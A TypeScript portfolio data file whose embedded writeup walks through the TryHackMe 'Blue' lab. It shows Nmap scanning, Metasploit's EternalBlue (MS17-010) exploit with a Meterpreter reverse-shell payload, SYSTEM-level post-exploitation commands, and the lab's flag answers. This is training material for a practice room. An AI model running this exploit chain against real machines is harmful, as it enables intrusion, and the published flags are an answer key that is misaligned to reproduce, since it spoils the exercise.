import type { Project } from '../../../types';

const project: Project = {
    id: 'thm-blue',
    title: 'Blue (EternalBlue)',
    description: 'Windows exploitation challenge focusing on the infamous EternalBlue vulnerability (MS17-010). Scanned for SMB vulnerabilities, verified the target was susceptible to EternalBlue, and successfully exploited the vulnerability using Metasploit. Gained SYSTEM-level access and retrieved sensitive flags. Demonstrated understanding of critical Windows vulnerabilities and post-exploitation techniques.',
    techStack: ['Windows', 'EternalBlue', 'Metasploit', 'SMB', 'MS17-010'],
    securityLevel: 'RESTRICTED',
    link: 'https://tryhackme.com/room/blue',
    writeup: `**Vulnerability Scanning**

Performed Nmap scan with vulnerability scripts to identify MS17-010 exposure:

\`\`\`bash
nmap -sV -vv --script vuln -oN nmap_vuln.txt 10.10.X.X
\`\`\`

Confirmed the system was running vulnerable SMB services (MS17-010 - EternalBlue).

**Metasploit Setup**

Launched Metasploit Framework and searched for EternalBlue exploits:

\`\`\`bash
msfconsole
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
\`\`\`

**Exploit Configuration**

Configured the exploit with target details:

\`\`\`bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.X.X
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
\`\`\`

**Exploitation Success**

The EternalBlue exploit successfully compromised the system:

\`\`\`
[*] Started reverse TCP handler on 10.X.X.X:4444
[*] 10.10.X.X:445 - Connecting to target for exploitation
[+] 10.10.X.X:445 - Connection established for exploitation
[*] Sending stage (200774 bytes) to 10.10.X.X
[*] Meterpreter session 1 opened
\`\`\`

**Post-Exploitation**

Used Meterpreter commands to enumerate the system:

\`\`\`bash
meterpreter > getuid
# Server username: NT AUTHORITY\\SYSTEM

meterpreter > sysinfo
meterpreter > ps
meterpreter > shell
\`\`\`

Confirmed SYSTEM-level access - the highest privilege on Windows!

**Flag Retrieval**

Navigated the filesystem to locate flags:

\`\`\`bash
C:\\> cd C:\\Users
C:\\Users> dir
C:\\Users> cd Jon\\Desktop
C:\\Users\\Jon\\Desktop> type flag1.txt
\`\`\`

🚩 **Flag 1**: flag{access_the_machine}

\`\`\`bash
C:\\> cd C:\\Windows\\System32\\config
C:\\Windows\\System32\\config> type flag2.txt
\`\`\`

🚩 **Flag 2**: flag{sam_database_elevated_access}

\`\`\`bash
C:\\> cd C:\\Users\\Jon\\Documents
C:\\Users\\Jon\\Documents> type flag3.txt
\`\`\`

🚩 **Flag 3**: flag{admin_documents_can_be_valuable}

**Key Takeaways**

- EternalBlue (MS17-010) is one of the most critical Windows vulnerabilities
- Metasploit simplifies exploitation of known vulnerabilities
- SYSTEM access provides complete control over Windows machines
- Always patch systems to prevent exploitation of known vulnerabilities
- The vulnerability was used in the WannaCry ransomware attack`
};

export default project;
